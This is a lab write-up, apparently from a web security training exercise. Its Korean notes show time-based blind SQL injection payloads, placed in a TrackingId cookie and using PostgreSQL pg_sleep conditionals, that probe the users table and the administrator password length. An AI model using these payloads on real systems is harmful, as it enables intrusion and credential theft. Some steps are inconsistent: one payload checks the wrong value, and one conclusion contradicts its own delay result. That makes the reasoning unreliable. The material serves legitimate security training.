#Lab: Blind SQL injection with time delays and information retrieval

This lab contains a blind SQL injection vulnerability. 
The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error.
However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
The database contains a different table called users, with columns called username and password. 
You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
To solve the lab, log in as the administrator user.

### 🔍 분석 및 공격 과정
0. DB 종류에 따른 여러가지 delay 함수를 넣어보며 DB종류 파악. -> pg_sleep() 작동.
>>> TrackingId=3xi1poxwtd1eM4ON'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
1. username이 administrator인 데이터가 있는지 체크
>>> TrackingId=3xi1poxwtd1eM4ON'%3BSELECT CASE WHEN (username='password') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
 --> 시간지연 발생 -> 존재.
2. administrator의 password 길이 체크.
>>> TrackingId=3xi1poxwtd1eM4ON'%3BSELECT CASE WHEN (LENGTH(password) > 10) THEN pg_sleep(10) ELSE pg_sleep(0) END from users where username ='administrator'--
 --> 시간지연 발생 -> 10글자 이상.
>>> TrackingId=3xi1poxwtd1eM4ON'%3BSELECT CASE WHEN (LENGTH(password) > 20) THEN pg_sleep(10) ELSE pg_sleep(0) END from users where username ='administrator'--
 --> 시간지연 발생 -> 20글자 이하.
>>> TrackingId=3xi1poxwtd1eM4ON'%3BSELECT CASE WHEN (LENGTH(password) = 20) THEN pg_sleep(10) ELSE pg_sleep(0) END from users where username ='administrator'--
 --> 시간지연 발생 -> password가 20글자임.
